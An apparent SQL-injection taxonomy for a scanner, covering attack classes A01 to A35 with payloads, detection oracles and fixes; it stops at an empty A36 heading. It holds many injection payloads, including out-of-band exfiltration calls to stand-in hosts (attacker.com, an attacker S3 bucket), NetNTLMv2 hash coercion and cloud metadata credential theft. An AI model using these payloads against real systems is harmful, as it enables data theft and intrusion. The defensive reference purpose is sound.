# Sentinel V6 — Master SQL Attack Universe & Taxonomy Reference

**Document Version**: 6.5.0  
**Classification**: Master Security Architecture & Attack Taxonomy  
**Target Coverage**: Classical, Modern, Cloud-Native, Distributed NewSQL, ORM/Compiler, and AI/Vector SQL Injections  
**Master Matrix**: 40 Attack Categories (A01 – A40) · 18 Formal Mechanisms (M01 – M18) · 19 Escalation Depth Levels (G1 – G19) · 30 DBMS Dialects · 30 WAF Evasion Transforms · 15 Verification Oracles · 8 Architectural Pillars  

---

## 1. Executive Summary & Taxonomy Architecture

SQL injection (SQLi) has evolved far beyond basic `' OR '1'='1` tautologies. In modern distributed architectures, SQL evaluation happens across layered data planes: microservices, ORMs, GraphQL compilers, cloud data warehouses, federated query engines, and vector similarity indexes.

Sentinel V6 models the entire SQL attack surface across an **11-dimensional taxonomy**:
1. **Attack Class (A01 – A40)**: The semantic, syntactic, and architectural family of the vulnerability.
2. **Core Injection Mechanism (M01 – M18)**: The fundamental execution logic utilized by the probe.
3. **Escalation Depth Ladder (G1 – G19)**: The non-destructive progression ladder from syntax break to cloud metadata exfiltration.
4. **Syntactic Context**: WHERE, HAVING, ORDER BY, GROUP BY, LIMIT, VALUES, ON, SELECT-list, identifier, or document operator.
5. **DBMS Dialect (30 Engines)**: PostgreSQL, MySQL, MariaDB, MSSQL, Oracle, SQLite, IBM Db2, H2, MS Access, Snowflake, BigQuery, ClickHouse, CockroachDB, YugabyteDB, Vitess, SingleStore, DuckDB, Apache Doris, Databricks SQL, Trino, Presto, Amazon Redshift, Azure Synapse, Teradata, Firebird, SAP HANA, Vertica, TimescaleDB, AlloyDB, and Generic SQL.
6. **Transport Protocol**: Query string, Form body, JSON body, XML body, HTTP headers, Cookies, WebSockets, Multipart, and GraphQL.
7. **Observation Oracle**: In-band reflection, Error disclosure, Boolean differential, Wald SPRT latency, DOM structural diff, and Out-of-Band (OAST) interactions.
8. **Evasion Transforms (E1 – E30)**: Whitespace mutation, encoding smuggling, comment fracturing, and AST logical equivalences.
9. **Execution Lifecycle**: Immediate synchronous, Second-order asynchronous, State-machine deferred, or Event-driven.
10. **Data Isolation Boundary**: Multi-tenant predicate, Row-Level Security (RLS), or Foreign Data Wrapper (FDW) link.
11. **Verification Logic**: Causal inference, Metamorphic relation testing (TLP/NoREC/PQS), and Z3 SMT constraint proofs.

---

## 2. Master Coverage Matrix: The 40 Attack Classes (A01 – A40)

```
+=======================================================================================================+
|                                    SENTINEL V6 ATTACK UNIVERSE (A01 - A40)                            |
+=======================================================================================================+
| A01: Value/WHERE Clause Injection          | A21: JSON/XML-to-SQL Operator Injection                  |
| A02: Numeric-Context Injection             | A22: Encoding & Canonicalization Smuggling               |
| A03: LIKE/Pattern Context Injection        | A23: Charset, Multi-byte & Collation Collisions          |
| A04: ORDER BY Expression Injection         | A24: Authentication/Authorization Query Manipulation     |
| A05: GROUP BY / HAVING Injection           | A25: Multi-Tenant & Row-Level Security Tampering         |
| A06: LIMIT / OFFSET Clause Injection       | A26: Transaction, Concurrency & State Contamination      |
| A07: JOIN / ON Clause Injection            | A27: Multi-Channel Blind Inference (Status/DOM/Content)  |
| A08: SELECT-List Expression Injection      | A28: Error-Based Type Coercion & Subquery Leaks          |
| A09: INSERT/UPDATE/DELETE Context          | A29: Time-Based Sequential Latency Probing (SPRT)        |
| A10: Dynamic Identifier Injection          | A30: Out-of-Band (OAST) Network Interaction              |
| A11: Dynamic Function/Operator Injection   | A31: Metamorphic Invariant Testing (TLP/NoREC/PQS)       |
| A12: CTE / WITH & Recursive Injection      | A32: Cloud DBaaS & Federated Lakehouse Injection         |
| A13: Window-Function Expression Injection  | A33: Distributed NewSQL & Consensus Parser Injection     |
| A14: Subquery & EXISTS Manipulation        | A34: Analytical & Columnar Warehouse MPP Injection      |
| A15: Set-Operation (UNION/INTERSECT/EXCEPT)| A35: Vector DB & AI Embedding Similarity Operator SQLi   |
| A16: Stored-Program & Exec Injection       | A36: DBMS-Specific Extension & Dialect Boundary SQLi     |
| A17: Database Trigger & Scheduled Events   | A37: Query-Compiler & AST Translation Injection          |
| A18: Second-Order & Async Storage SQLi     | A38: API Transport & Protocol Header Injection           |
| A19: ORM & Query-Builder AST Injection     | A39: Automated Schema & Metadata Discovery               |
| A20: GraphQL-to-SQL Compiler Injection     | A40: Application-State & Asynchronous Lifecycle Flows    |
+=======================================================================================================+
```

---

## 3. Comprehensive Deep-Dive: All 40 Attack Classes

### A01: Value / WHERE Clause Injection
- **Core Mechanism**: M01 (Boolean), M02 (Error), M03 (UNION), M04 (Time).
- **Syntactic Context**: Literal strings enclosed in single quotes (`'...'`), double quotes (`"..."`), or parenthesized expressions (`('...')`).
- **Technical Breakdown**: Occurs when unvalidated user input is directly concatenated into a SQL `WHERE` clause. Attackers supply boundary delimiters (`'`, `"`, `\`) followed by boolean operators (`OR`, `AND`), algebraic tautologies (`'1'='1`), or statement terminators (`;`).
- **Dialect Variations**:
  - *PostgreSQL/Oracle/SQLite*: String literal escaping via doubled quote (`''`).
  - *MySQL/MariaDB*: Supports both single quote escaping (`''`) and backslash escaping (`\'`).
  - *MSSQL*: Escapes quotes via doubled single quote (`''`), bracket quotes for identifiers.
- **Verification Oracle**: Non-destructive boolean differential testing (evaluating `AND 1337=1337` vs `AND 1337=1338`) and Wald SPRT statistical timing.
- **Defensive Remediation**: Strict parameterized queries (`PreparedStatement`, `$1`, `?`). Never construct filtering predicates via string interpolation.

---

### A02: Numeric-Context Injection
- **Core Mechanism**: M01 (Boolean), M04 (Time), M02 (Error).
- **Syntactic Context**: Unquoted numerical parameter positions (e.g., `SELECT * FROM items WHERE id = $input`).
- **Technical Breakdown**: Because numeric parameters are unquoted, boundary characters like single or double quotes are unnecessary. Input such as `100-0` or `100-CASE WHEN 1=1 THEN 0 ELSE 1 END` directly modifies query logic. Attackers also exploit scientific notation parsing (`1e0`), hexadecimal literals (`0x7e`), and integer overflow/underflow boundaries (`2147483648`).
- **Verification Oracle**: Arithmetic identity verification: comparing response to `id = 100`, `id = 100+0`, `id = 100-0` (must be identical) versus `id = 100+1` (must diverge).
- **Defensive Remediation**: Strict type casting in application middleware (`parseInt(input, 10)`, `int(input)`) combined with typed parameter bindings.

---

### A03: LIKE / Pattern Context Injection
- **Core Mechanism**: M01 (Boolean), M09 (Metamorphic).
- **Syntactic Context**: String pattern matching predicates (`WHERE name LIKE '%$input%'` or `WHERE name ILIKE '$input'`).
- **Technical Breakdown**: User inputs containing wildcard characters (`%` matching zero or more characters, `_` matching any single character) alter matching semantics. In MSSQL, character classes (`[a-z]`) can be injected. If developers attempt simple quote escaping without escaping wildcards or mishandle custom `ESCAPE` clauses, attackers can infer secrets character-by-character or induce computational ReDoS in regular expression engines (`REGEXP`, `~*`).
- **Verification Oracle**: Wildcard expansion differential: comparing exact match `test` with wildcards `t_st` and `t%st`.
- **Defensive Remediation**: Escape wildcard characters with a dedicated escape character: `WHERE col LIKE ? ESCAPE '\'` where `%` and `_` in user input are prefixed with `\`.

---

### A04: ORDER BY Expression Injection
- **Core Mechanism**: M06 (Sorting Invariant), M04 (Time).
- **Syntactic Context**: Unquoted sorting directives (`SELECT * FROM users ORDER BY $sort_column $sort_dir`).
- **Technical Breakdown**: Standard SQL drivers do not allow column names or sorting expressions in `ORDER BY` to be parameterized with bind variables. Attackers inject positional column indexes (`ORDER BY 1`), conditional expressions (`ORDER BY (CASE WHEN (1=1) THEN username ELSE id END)`), or subquery timing delays.
- **Verification Oracle**: Sort order divergence: comparing item ordering between TRUE condition (`CASE WHEN 1=1 THEN id ELSE date END`) and FALSE condition (`CASE WHEN 1=2 THEN id ELSE date END`).
- **Defensive Remediation**: Strict allowlisting against an immutable map of permitted sortable column identifiers and directions (`ASC` / `DESC`).

---

### A05: GROUP BY / HAVING Expression Injection
- **Core Mechanism**: M01 (Boolean), M02 (Error), M06 (Sorting).
- **Syntactic Context**: Aggregation grouping expressions and post-aggregation filtering conditions.
- **Technical Breakdown**: Injections inside `GROUP BY` allow altering grouping dimensions, while `HAVING` clause injections permit evaluating boolean predicates against aggregated datasets (`HAVING count(*) > 0 AND (SELECT 1)=1`).
- **Verification Oracle**: Aggregation count differential: comparing response row cardinality when conditional HAVING predicates evaluate to TRUE vs FALSE.
- **Defensive Remediation**: Structural static grouping definitions and parameterized HAVING filters.

---

### A06: LIMIT / OFFSET Clause Injection
- **Core Mechanism**: M01 (Boolean), M04 (Time), M05 (Stacked).
- **Syntactic Context**: Result set pagination boundaries (`LIMIT $limit OFFSET $offset`).
- **Technical Breakdown**: Unvalidated pagination parameters allow injection into numerical boundaries. In legacy MySQL (5.x), attackers could chain `PROCEDURE ANALYSE()`. In modern PostgreSQL and SQLite, attackers can inject subqueries or stacked queries when multi-statement drivers are enabled.
- **Verification Oracle**: Pagination window validation: verifying whether `OFFSET (1-1)` yields page 1 while `OFFSET 0` yields page 1.
- **Defensive Remediation**: Enforce strict unsigned integer validation at the API controller layer before constructing queries.

---

### A07: JOIN / ON Clause Injection
- **Core Mechanism**: M01 (Boolean), M09 (Metamorphic).
- **Syntactic Context**: Table join conditions (`FROM orders JOIN users ON orders.user_id = $input`).
- **Technical Breakdown**: Injecting into the `ON` condition allows appending arbitrary relational constraints (`ON orders.user_id = 1 AND 1=1`), joining unintended tables, or forcing `CROSS JOIN` combinations that produce Cartesian explosions and server-side CPU starvation.
- **Verification Oracle**: Relational cardinality checking and metamorphic invariants comparing inner join vs partitioned join conditions.
- **Defensive Remediation**: Fully qualify all relational joins in pre-compiled SQL queries with static schemas and bind-variable ON clauses.

---

### A08: SELECT-List Expression Injection
- **Core Mechanism**: M03 (UNION), M02 (Error), M01 (Boolean).
- **Syntactic Context**: Projected column list (`SELECT id, name, $column FROM products`).
- **Technical Breakdown**: When applications dynamically construct column lists based on user-requested field sets (e.g., in REST/JSON APIs), an attacker can inject arbitrary scalar subqueries (`(SELECT password FROM users LIMIT 1) AS custom_field`) to exfiltrate unauthorized data directly in the HTTP response.
- **Verification Oracle**: Reflection analysis: inspecting response payload for canary constants emitted by injected expressions (e.g. `'CANARY_' || '7331'`).
- **Defensive Remediation**: Strict allowlisting of client-requestable field names against a fixed data model schema.

---

### A09: INSERT / UPDATE / DELETE Context Injection
- **Core Mechanism**: M01 (Boolean), M07 (Second-Order), M05 (Stacked).
- **Syntactic Context**: Data Manipulation Language (DML) statements (`INSERT INTO ... VALUES (...)`, `UPDATE ... SET ...`, `DELETE FROM ...`).
- **Technical Breakdown**:
  - *INSERT*: Injecting commas and closing parentheses in `VALUES` lists shifts column alignment, allowing attackers to write arbitrary values into administrative columns (e.g. `role='admin'`).
  - *UPDATE*: Injecting into `SET` assignments or breaking the `WHERE` clause allows mass overwriting of entire tables (`UPDATE users SET email='attacker@evil.com' -- WHERE id=1`).
  - *DELETE*: Commenting out the `WHERE` predicate results in mass table truncation.
- **Verification Oracle**: Non-destructive canary insertions with rolled-back transaction scopes or differential error verification.
- **Defensive Remediation**: Parameterized DML statements and database-level transaction rollbacks during auditing.

---

### A10: Dynamic Identifier Injection (Table / Column / Schema)
- **Core Mechanism**: M06 (Sorting), M01 (Boolean).
- **Syntactic Context**: Database table names, schema names, column names, table aliases, and sorting directions.
- **Technical Breakdown**: SQL standards forbid binding schema identifiers using query parameters (`?`). When applications construct dynamic queries (e.g. tenant-specific tables `tenant_${id}_orders` or dynamic column filters), injection in identifier slots allows accessing unauthorized tables or escaping into clause evaluation.
- **Verification Oracle**: Catalog existence differential: comparing queries pointing to valid system tables (`information_schema.tables`) versus non-existent identifiers.
- **Defensive Remediation**: Never accept raw identifier strings. Use a strict white-list dictionary mapping public API names to internal SQL identifier enums, wrapped in engine-specific quote identifiers (`"name"` in PG, `[name]` in MSSQL, `` `name` `` in MySQL).

---

### A11: Dynamic Function & Operator Injection
- **Core Mechanism**: M01 (Boolean), M02 (Error).
- **Syntactic Context**: Function calls (`SELECT $agg_func(price) FROM items`) and binary operators (`WHERE age $op 18`).
- **Technical Breakdown**: Allowing users to select aggregate functions (e.g., `SUM`, `AVG`, `MIN`) or comparison operators (`=`, `>`, `<`, `LIKE`) without strict validation allows invoking dangerous functions or replacing equality checks with tautological operators.
- **Verification Oracle**: Function equivalence testing and invalid function signature error trapping.
- **Defensive Remediation**: Enum mapping at the API gateway layer.

---

### A12: CTE / WITH & Recursive Query Injection
- **Core Mechanism**: M01 (Boolean), M04 (Time).
- **Syntactic Context**: Common Table Expressions (`WITH cte AS (SELECT ...) SELECT * FROM cte`).
- **Technical Breakdown**: Injecting into CTE definitions allows chaining arbitrary secondary recursive queries (`WITH RECURSIVE r AS (...)`), executing subqueries before main statement filters, or inducing infinite recursion to exhaust database memory.
- **Verification Oracle**: Structural parse tree evaluation and recursion depth timing limiters.
- **Defensive Remediation**: Static query definitions with parameterized leaf nodes.

---

### A13: Window-Function Expression Injection
- **Core Mechanism**: M06 (Sorting), M01 (Boolean).
- **Syntactic Context**: Analytic window definitions (`OVER (PARTITION BY $part ORDER BY $sort ROWS BETWEEN $frame)`).
- **Technical Breakdown**: Analytic queries in modern reporting engines allow attackers to inject into partition boundaries or frame specifications, leaking statistical variance or accessing unauthorized rows within partitions.
- **Verification Oracle**: Window cardinality inspection and ordering invariant verification.
- **Defensive Remediation**: Parameterize values within window frames; allowlist partition and ordering columns.

---

### A14: Subquery & EXISTS Clause Manipulation
- **Core Mechanism**: M01 (Boolean), M04 (Time).
- **Syntactic Context**: Nested scalar subqueries and existential predicates (`WHERE EXISTS (SELECT 1 FROM ...)`, `WHERE id IN (SELECT ...)`).
- **Technical Breakdown**: Attackers inject subqueries to correlate external unindexed tables with target rows, evaluating conditions like `EXISTS(SELECT 1 FROM sensitive_data WHERE secret LIKE 'a%')` to infer data bit-by-bit.
- **Verification Oracle**: Boolean differential verification using known existential constants (`EXISTS(SELECT 1)` vs `EXISTS(SELECT 1 WHERE 1=2)`).
- **Defensive Remediation**: Explicit parameterized subqueries and strict join abstraction.

---

### A15: Set-Operation Injection (UNION / INTERSECT / EXCEPT)
- **Core Mechanism**: M03 (UNION-Based Canary & Set Extension).
- **Syntactic Context**: Combining independent result sets via `UNION`, `UNION ALL`, `INTERSECT`, or `EXCEPT`/`MINUS`.
- **Technical Breakdown**: Enables direct in-band data extraction. Attackers:
  1. Determine the exact number of projected columns using sequential `ORDER BY N` or `UNION SELECT NULL, NULL, ...`.
  2. Harmonize data types across positions to match the initial query's type constraints.
  3. Replace NULL placeholders with target metadata functions or subqueries.
- **Verification Oracle**: Canary reflection: injecting unique entropy strings (`CANARY_x7f2`) and scanning response bodies for exact reflection.
- **Defensive Remediation**: Parameterized queries; prevent untrusted concatenation before set operators.

---

### A16: Stored-Program & Procedure Argument Injection
- **Core Mechanism**: M11 (Dynamic Query & Stored Procedure Injection).
- **Syntactic Context**: Arguments passed to stored procedures or functions that execute dynamic SQL internally (`EXECUTE IMMEDIATE`, `sp_executesql`, `EXEC()`).
- **Technical Breakdown**: Even if the outer application uses parameterized calls to invoke a stored procedure (e.g. `CALL search_proc(?)`), if the procedure internally concatenates parameters into a dynamic SQL string without internal escaping, injection occurs inside the database execution context.
- **Verification Oracle**: Nested quotation escaping verification: injecting `''` and `''''` to test for procedural string breakout.
- **Defensive Remediation**: Avoid dynamic SQL inside stored procedures; use `sp_executesql` with internal parameter definitions or PL/pgSQL `EXECUTE ... USING`.

---

### A17: Database Trigger & Scheduled Event Injection
- **Core Mechanism**: M07 (Second-Order), M05 (Stacked).
- **Syntactic Context**: Operations triggering asynchronous database hooks (`BEFORE/AFTER INSERT/UPDATE` triggers, `pg_cron`, MySQL `CREATE EVENT`).
- **Technical Breakdown**: Injected payloads are written cleanly to a table, but trigger secondary procedural logic when background triggers fire or scheduled database maintenance jobs run, executing with the elevated privileges of the database service.
- **Verification Oracle**: State-change side effect monitoring and temporal latency tracking across scheduled intervals.
- **Defensive Remediation**: Audit all database trigger logic for string concatenation; enforce least privilege on trigger execution owners.

---

### A18: Second-Order & Asynchronous Storage Injection
- **Core Mechanism**: M07 (Second-Order Workflow & Storage Injection).
- **Syntactic Context**: Decoupled ingestion and execution endpoints (e.g. user profile registration → admin PDF report generator).
- **Technical Breakdown**: The payload is stored safely into a database without causing an immediate injection (often parameterized at the ingestion point). However, a secondary application subsystem (such as a nightly reporting script, fraud-analysis daemon, or administrative search) reads the stored string and concatenates it into an unparameterized query.
- **Verification Oracle**: Multi-endpoint taint tracking: correlating data injected at Source Endpoint $E_1$ with behavioral or OAST interactions triggered at Target Consumer $E_2$.
- **Defensive Remediation**: Treat data retrieved from the database as untrusted user input; always parameterize downstream consumer queries.

---

### A19: ORM & Query-Builder AST Boundary Flaws
- **Core Mechanism**: M18 (ORM & Query Compiler AST Injection).
- **Syntactic Context**: Object-Relational Mappers (Hibernate, Prisma, TypeORM, Django ORM, Sequelize, SQLAlchemy).
- **Technical Breakdown**:
  - *Raw Escape Hatches*: Developers fall back to unparameterized raw methods like Prisma `$queryRawUnsafe()`, Sequelize `sequelize.literal()`, or TypeORM `where("raw condition " + input)`.
  - *Delimiter Injection*: CVE-2020-7471 in Django ORM where unescaped delimiters in `StringAgg` allowed SQL execution.
  - *HQL/JPQL Path Traversal*: Injecting into Hibernate entity paths to traverse unintended relationships.
- **Verification Oracle**: AST boundary breakout testing using balanced parenthesis and quote sequences (`') OR ('1'='1`).
- **Defensive Remediation**: Deprecate raw query escape hatches; strictly use strongly typed query builder APIs and Prisma `$queryRaw` tagged template literals.

---

### A20: GraphQL-to-SQL Compiler Injection
- **Core Mechanism**: M18 (Query Compiler AST), M20 (GraphQL).
- **Syntactic Context**: GraphQL query arguments, directives, and filters transpiled to SQL by query compilers (Hasura, PostGraphile, Prisma).
- **Technical Breakdown**: Maliciously crafted GraphQL filter structures (e.g. deeply nested `_where` JSON objects) can trigger compiler translation edge cases where unescaped string literals are emitted into the underlying SQL join or where clauses.
- **Verification Oracle**: GraphQL error graph parsing and AST mutation differentials.
- **Defensive Remediation**: Restrict exposed GraphQL filtering capabilities; disable arbitrary client-side filtering operators in production.

---

### A21: JSON / XML Document Operator Injection
- **Core Mechanism**: M10 (JSON / XML Structured Document SQL Operators).
- **Syntactic Context**: Document extraction operators (`->`, `->>`, `#>`, `JSON_VALUE`, `OPENXML`, `xpath`).
- **Technical Breakdown**: Modern web APIs store semi-structured JSON/XML documents inside relational tables. User inputs defining JSON paths or keys concatenated into SQL document functions allow breaking out into standard SQL expressions.
- **Verification Oracle**: JSON syntax error disclosure and boolean operator evaluation across extracted fields.
- **Defensive Remediation**: Use parameterized JSON path arguments (e.g. `jsonb_extract_path(col, $1)`).

---

### A22: Encoding, Canonicalization & Normalization Smuggling
- **Core Mechanism**: M12 (Encoding & Mismatch).
- **Syntactic Context**: Multi-layer perimeter processing pipelines (WAF → Reverse Proxy → API Gateway → Application → Database Driver).
- **Technical Breakdown**:
  - *Multi-Stage URL Decoding*: WAF decodes once; application decodes twice (`%2527` → `%27` → `'`).
  - *Unicode Normalization*: Sending compatibility characters (`U+FF07` fullwidth apostrophe `＇`, or `U+02B9` modifier letter prime `ʹ`) that pass WAF inspection and convert into ASCII single quotes (`'`) during server-side Unicode NFKD normalization.
  - *UTF-16 / UTF-32 Smuggling*: Alternate byte encodings bypassing ASCII-only inspection engines.
- **Verification Oracle**: Multi-encoding matrix probing across 30 WAF evasion transforms.
- **Defensive Remediation**: Canonicalize and normalize inputs *before* security inspection; perform decoding exactly once at the edge.

---

### A23: Charset, Multi-byte & Collation Collisions
- **Core Mechanism**: M12 (Charset & Multi-byte Mismatch).
- **Syntactic Context**: Database connection character sets and table collations.
- **Technical Breakdown**:
  - *GBK Multibyte Smuggling*: In GBK/Big5 character sets, byte `%df` combines with an escaping backslash `\` (`%5c`) to form a valid multi-byte Chinese character (`%df%5c`), leaving the trailing single quote unescaped.
  - *Collation Equivalence*: In certain UTF-8 collations (e.g. `utf8_general_ci`), German sharp-s `ß` matches `ss`, and ligature `æ` matches `ae`, allowing authentication bypasses via character expansion.
  - *VARCHAR Truncation*: In MySQL non-strict mode, inserting strings exceeding column length silently truncates trailing characters, allowing duplicate username registration.
- **Verification Oracle**: Multibyte boundary fuzzing (`%df'`, `%bf'`) and collation invariant verification.
- **Defensive Remediation**: Enforce `utf8mb4` with strict SQL modes (`STRICT_ALL_TABLES`) across both client connection pools and database engines.

---

### A24: Authentication & Authorization Query Manipulation
- **Core Mechanism**: M01 (Boolean Tautology), M05 (Stacked).
- **Syntactic Context**: Authentication credential verification queries (`SELECT * FROM users WHERE username = '$user' AND password = '$pwd'`).
- **Technical Breakdown**: Injected tautologies (`admin'--`) bypass credential checks by nullifying the password comparison condition, returning the first matching user record (typically administrative accounts).
- **Verification Oracle**: Authentication bypass state verification: detecting successful session establishment or JWT token issuance without valid credentials.
- **Defensive Remediation**: Use constant-time password hashing algorithms (Argon2id, bcrypt) with fully parameterized user lookups; never verify passwords inside dynamic SQL queries.

---

### A25: Multi-Tenant & Row-Level Security (RLS) Tampering
- **Core Mechanism**: M01 (Boolean), M18 (ORM/Compiler).
- **Syntactic Context**: Shared multi-tenant tables filtered by `tenant_id` or database Row-Level Security (RLS) policies.
- **Technical Breakdown**: In multi-tenant architectures where multiple clients share the same schema, appending tautologies (`OR 1=1`) or injecting into `tenant_id` query predicates strips tenant isolation, causing massive cross-tenant data exposure.
- **Verification Oracle**: Cross-tenant data reflection: verifying if records belonging to Tenant B are returned in a session authenticated as Tenant A.
- **Defensive Remediation**: Enforce PostgreSQL Row-Level Security (RLS) policies at the database kernel level based on session variables (`current_setting('app.current_tenant')`) rather than relying solely on application-level filtering predicates.

---

### A26: Transaction, Concurrency & State Contamination
- **Core Mechanism**: M05 (Stacked), M11 (Dynamic Query).
- **Syntactic Context**: ACID transaction isolation levels, connection pooling, and multi-statement flows.
- **Technical Breakdown**:
  - *Connection Pool Pollution*: Injecting session configuration statements (e.g. `SET sql_mode=''`, `SET ROLE 'admin'`) alters the behavior of subsequent queries executed by different users sharing the pooled database connection.
  - *Race Conditions*: Exploiting low isolation levels (`READ UNCOMMITTED`) using concurrent requests to read uncommitted dirty data during transaction rollbacks.
- **Verification Oracle**: Session state differential verification across pooled connection re-acquisitions.
- **Defensive Remediation**: Always reset connection state upon returning connections to the pool; use strict transaction isolation (`SERIALIZABLE` or `REPEATABLE READ`).

---

### A27: Multi-Channel Blind Inference (Status / DOM / Content)
- **Core Mechanism**: M01 (Boolean-Based Differential Inference).
- **Syntactic Context**: Completely silent endpoints where no error messages, query results, or canary tokens are reflected.
- **Technical Breakdown**: When an application provides no direct output, attackers evaluate conditional expressions that cause subtle divergences in application behavior. Sentinel audits across 5 distinct blind channels:
  1. *HTTP Status Codes* (200 OK vs 500 Error vs 404 Not Found)
  2. *DOM Structural Hashes* (comparing HTML parse tree representations)
  3. *Content Body Hashes* (dynamic content stripping + threshold calibration)
  4. *Response Size / Compression Divergence*
  5. *Header Divergence* (Location redirect vs inline response)
- **Verification Oracle**: High-speed binary search logarithmic extraction ($O(\log_2 |\Sigma|)$) over candidate character byte ranges.
- **Defensive Remediation**: Uniform response handling and parameterized query structures.

---

### A28: Error-Based Type Coercion & Subquery Leaks
- **Core Mechanism**: M02 (Error-Based Type Coercion / XML / Subquery).
- **Syntactic Context**: Verbose database error disclosure enabled in development or misconfigured production servers.
- **Technical Breakdown**: Attackers deliberately trigger runtime exceptions that include the evaluated string value inside the error message.
  - *PostgreSQL*: `CAST((SELECT version()) AS int)`
  - *MSSQL*: `CONVERT(int, (SELECT @@version))`
  - *MySQL*: `ExtractValue(1, CONCAT(0x7e, (SELECT version())))` or `UpdateXML(1, CONCAT(0x7e, ...), 1)`
  - *Oracle*: `CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE ROWNUM=1))`
- **Verification Oracle**: Regular expression signature extraction matching known database error formats.
- **Defensive Remediation**: Disable verbose database error messages; display generic error pages to end-users and log technical stack traces internally.

---

### A29: Time-Based Sequential Latency Probing (SPRT)
- **Core Mechanism**: M04 (Time-Based Sequential Latency Probing).
- **Syntactic Context**: Completely blind environments with zero content or status divergence.
- **Technical Breakdown**: Attackers inject conditional delay primitives that sleep for a fixed duration if and only if a candidate boolean condition is TRUE.
  - *PostgreSQL*: `pg_sleep(5)`
  - *MySQL*: `SLEEP(5)`
  - *MSSQL*: `WAITFOR DELAY '0:0:5'`
  - *Oracle*: `DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5)`
  - *SQLite*: Heavy computation `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))`
- **Verification Oracle**: Wald Sequential Probability Ratio Test (SPRT). Sentinel evaluates sequential log-likelihood ratios between $H_0$ (normal network jitter) and $H_1$ (induced execution latency), reaching mathematical certainty with minimal requests.
- **Defensive Remediation**: Database query timeout limits and parameterized query execution.

---

### A30: Out-of-Band (OAST) Network Interaction
- **Core Mechanism**: M08 (Out-of-Band Network Interaction).
- **Syntactic Context**: Blind injection where egress network traffic is permitted from the database server host.
- **Technical Breakdown**: Coerces the database engine to perform external DNS resolutions, HTTP requests, or Windows SMB NetNTLMv2 authentication attempts to an external listener controlled by the auditor.
  - *MSSQL*: `master..xp_dirtree '\\attacker-controlled.host\share'` (coerces NetNTLMv2 hash)
  - *Oracle*: `UTL_HTTP.REQUEST('http://attacker.com/leak')` or `UTL_INADDR.GET_HOST_ADDRESS`
  - *PostgreSQL*: `SELECT net.http_get('http://attacker.com')` via `pg_net` or `COPY FROM PROGRAM`
- **Verification Oracle**: Collaborator interaction webhook confirmation (DNS A/AAAA lookup, HTTP GET request, or SMB handshake).
- **Defensive Remediation**: Restrict database server egress networking; block outbound port 53 (DNS), 80/443 (HTTP), and 445 (SMB) at the host and VPC firewall level.

---

### A31: Metamorphic Invariant Testing (TLP / NoREC / PQS)
- **Core Mechanism**: M09 (Relational Metamorphic Testing).
- **Syntactic Context**: Complex logic-level SQL bugs in query planners and optimization engines.
- **Technical Breakdown**: Based on USENIX Security 2020 research (Rigger & Su). Instead of looking for crashes or errors, metamorphic testing checks for violations of relational algebra invariants:
  - *TLP (Ternary Logic Partitioning)*: The partition identity must hold:
    $$\mathcal{Q}(\text{WHERE } P) \cup \mathcal{Q}(\text{WHERE NOT } P) \cup \mathcal{Q}(\text{WHERE } P \text{ IS NULL}) \equiv \mathcal{Q}(\text{WHERE TRUE})$$
  - *NoREC (Non-optimizing Reference Engine Comparison)*: An optimized query must return the exact same row count as a non-optimized reference query using un-indexed subqueries.
- **Verification Oracle**: Metamorphic partition invariant equivalence verification.
- **Defensive Remediation**: Ensure database query optimizer patches are up to date.

---

### A32: Cloud DBaaS & Federated Lakehouse Injection
- **Core Mechanism**: M14 (Lateral Pivot), M08 (OAST).
- **Syntactic Context**: Managed cloud databases (AWS Aurora, Google Cloud SQL, Supabase) and federated lakehouses (AWS Athena, Trino, Presto).
- **Technical Breakdown**: In cloud environments, injection vectors can bridge to cloud control planes:
  - *Cloud Instance Metadata SSRF*: Exfiltrating IAM credentials by querying `http://169.254.169.254/latest/meta-data/` via database HTTP extensions (`pg_net`, `UTL_HTTP`).
  - *External Object Storage Stages*: Exfiltrating table contents directly to attacker-controlled cloud storage (`COPY INTO 's3://attacker-bucket/'`).
  - *Federated Connectors*: Traversing foreign data wrappers (FDW) to access cross-cloud datasets.
- **Verification Oracle**: Non-destructive cloud metadata availability checks and mock external stage validation.
- **Defensive Remediation**: Disable instance metadata service v1 (enforce IMDSv2 with token hops = 1); restrict database IAM execution roles.

---

### A33: Distributed NewSQL & Consensus Parser Injection
- **Core Mechanism**: M15 (NewSQL & Distributed Consensus).
- **Syntactic Context**: Distributed, horizontally scalable consensus databases (CockroachDB, TiDB, YugabyteDB).
- **Technical Breakdown**: Distributed NewSQL engines emulate classical dialects (PostgreSQL or MySQL) but have subtle parser differentials, unique system tables (e.g. `crdb_internal`), and distinct Raft partition transactional boundaries. Attackers craft polyglots targeting parser discrepancies between the frontend SQL proxy and backend Raft consensus storage nodes.
- **Verification Oracle**: Engine-specific built-in function detection (`version()` vs `crdb_internal.node_id()`).
- **Defensive Remediation**: Use standard Postgres/MySQL ORM configurations with strict parameterization.

---

### A34: Analytical & Columnar Warehouse MPP Injection
- **Core Mechanism**: M17 (Cloud Data Warehouse & Columnar MPP).
- **Syntactic Context**: Cloud analytical data warehouses (Snowflake, Google BigQuery, ClickHouse).
- **Technical Breakdown**:
  - *Google BigQuery*: Lacks a sleep function; time-based blind injection requires generating heavy computational arrays:
    `UNNEST(GENERATE_ARRAY(1, 4000000))` or triggering CPU ReDoS backtracking via `REGEXP_CONTAINS`.
  - *Snowflake*: Blind delay testing via `SYSTEM$WAIT(5)`; exfiltration through external stages.
  - *ClickHouse*: Vectorized delay testing via `sleep(5)` or conditional exceptions via `throwIf(condition)`.
- **Verification Oracle**: Analytical computational latency differential and vectorized error trapping.
- **Defensive Remediation**: Enforce service-account warehouse cost limits and query timeout ceilings; parameterize analytical BI queries.

---

### A35: Vector DB & AI Embedding Similarity Operator Injection
- **Core Mechanism**: M16 (Vector DB & AI Embedding Operators).
- **Syntactic Context**: AI Retrieval-Augmented Generation (RAG) semantic search pipelines using vector databases (pgvector, SQLite-vss).
- **Technical Breakdown**: Applications constructing dynamic vector distance queries (e.g. `SELECT * FROM docs ORDER BY embedding <-> '[0.1, 0.2, ...]' LIMIT 5`) allow injecting distance operators (`<->` L2 distance, `<=>` cosine distance, `<#>` negative inner product) or manipulating metadata filtering predicates, causing the LLM context to ingest untrusted documents (Indirect Prompt Injection).
- **Verification Oracle**: Vector dimension syntax error validation and similarity ranking differential.
- **Defensive Remediation**: Bind vector embeddings as typed array parameters; validate vector dimensionality before query synthesis.

---

### A36: DBMS-Specific Extension & Dialect Boundary Injection
